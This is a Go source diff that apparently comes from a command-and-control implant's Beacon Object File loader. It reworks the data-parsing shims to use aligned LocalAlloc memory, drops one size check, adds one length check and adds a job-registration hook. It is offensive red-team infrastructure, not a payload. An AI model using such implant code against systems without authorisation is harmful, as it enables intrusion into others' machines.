@@ -69,6 +69,7 @@ var (
 
 var (
 	bofImpersonate uint32 = 0
+	CurrentTaskID  uint32 = 0
 )
 
 func parsePrintfFormat(fmtStr string, args []uintptr) string {
@@ -233,9 +234,9 @@ func GetCoffOutputForChannel(channel chan<- interface{}) func(int, uintptr, int)
 		if length <= 0 {
 			return 0
 		}
-		out := memory.ReadBytesFromPtr(data, uint32(length))
 
 		channel <- beaconType
+		out := memory.ReadBytesFromPtr(data, uint32(length))
 		channel <- []byte(out)
 		return 1
 	}
@@ -293,42 +294,55 @@ func DataExtract(datap *datap, size *uint32) uintptr {
 	datap.buffer += uintptr(4)
 	datap.length -= 4
 	if datap.length < binaryLength {
+
 		return 0
 	}
 
-	out := make([]byte, binaryLength)
-	memory.MemCpy(uintptr(unsafe.Pointer(&out[0])), datap.buffer, binaryLength)
+	// Allocate new aligned memory for the data.
+	// Direct pointers to the packed buffer may be unaligned, causing issues with BOFs expecting strict alignment.
+	// Note: LocalAlloc without LocalFree leaks memory but guarantees 8-byte alignment.
+
+	// Allocate unmanaged memory via LocalAlloc (LPTR = 0x40)
+	ptr, _, _ := procLocalAlloc.Call(0x40, uintptr(binaryLength))
+	if ptr == 0 {
+
+		return 0
+	}
+
+	// Copy to unmanaged memory
+
+	memory.MemCpy(ptr, datap.buffer, binaryLength)
 	if uintptr(unsafe.Pointer(size)) != uintptr(0) && binaryLength != 0 {
 		*size = binaryLength
 	}
 
 	datap.buffer += uintptr(binaryLength)
 	datap.length -= binaryLength
-	return uintptr(unsafe.Pointer(&out[0]))
+	return ptr
 }
 
 // export BeaconDataParse
-func DataParse(datap *datap, buff uintptr, size uint32) uintptr {
-	if size <= 0 {
-		return 0
-	}
-	datap.original = buff
-	datap.buffer = buff + uintptr(4)
+func DataParse(datap *datap, buffer uintptr, size uint32) uintptr {
+	datap.original = buffer
+	datap.buffer = buffer + uintptr(4)
 	datap.length = size - 4
 	datap.size = size - 4
 	return 1
 }
 
+func DataLength(datap *datap) uintptr {
+	return uintptr(datap.length)
+}
+
 // export BeaconDataInt
 func DataInt(datap *datap) uintptr {
+	if datap.length < 4 {
+		return 0
+	}
 	value := memory.ReadUIntFromPtr(datap.buffer)
 	datap.buffer += uintptr(4)
 	datap.length -= 4
 	return uintptr(value)
-}
-
-func DataLength(datap *datap) uintptr {
-	return uintptr(datap.length)
 }
 
 // export BeaconDataShort
@@ -630,4 +644,20 @@ func AxDownloadMemory(channel chan<- interface{}) func(uintptr, uintptr, int) ui
 		channel <- buf.Bytes()
 		return 1
 	}
+}
+
+var RegisterJobFunc func(taskId uint32, hProcess uintptr, pid uint16, hPipeRead uintptr, hPipeWrite uintptr) bool
+
+// export BeaconJobRegister
+func JobRegister(taskId uint32, hProcess uintptr, pid uint16, hPipeRead uintptr, hPipeWrite uintptr) uintptr {
+
+	if RegisterJobFunc != nil {
+		if CurrentTaskID != 0 {
+			taskId = CurrentTaskID
+		}
+		if RegisterJobFunc(taskId, hProcess, pid, hPipeRead, hPipeWrite) {
+			return 1 // TRUE
+		}
+	}
+	return 0 // FALSE
 }
